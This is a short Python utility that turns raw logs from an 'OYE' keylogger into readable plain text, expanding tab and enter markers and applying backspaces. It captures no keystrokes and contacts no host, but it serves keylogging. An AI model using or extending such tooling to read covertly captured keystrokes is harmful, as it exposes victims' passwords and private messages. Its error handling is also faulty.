VERSION = '1.2'
AUTHOR = 'admin87'


def main():
    intro()
    run()


def conv2plaintxt(directory, log_name):
    plain_text_name = directory + '\\' + '.'.join(log_name.split('.')[:-1]) + "_plain.txt"
    try:
        log = open(directory + '\\' + log_name, 'r')
        plain_text = open(plain_text_name, 'w')
    except FileNotFoundError:
        run()
    text = log.read()
    text = text.replace("<<T>>", '\t')
    text = text.replace("<<E>>", '\n')
    text = text.replace("<<?>>", '')
    while text.find("<<B>>") != -1:
        text = text[:text.find("<<B>>") - 1] + text[text.find("<<B>>") + 5:]
    plain_text.write(text)
    del text
    plain_text.close()
    log.close()


def get_file():
    file_name = input("Please provide the full path to the file: ")
    return file_name


def run():
    file_path = get_file()
    conv2plaintxt('\\'.join(file_path.split('\\')[:-1]), file_path.split('\\')[-1])
    print("\n[+] Done converting\n")


def intro():
    print()
    print("+-------------------------------------------------------+")
    print("|                                                       |")
    print("| Welcome to the OYE raw keylog to plain text converter |")
    print("|              Version " + VERSION + " made by " + AUTHOR + "              |")
    print("|                                                       |")
    print("+-------------------------------------------------------+")
    print()


if __name__ == '__main__':
    main()
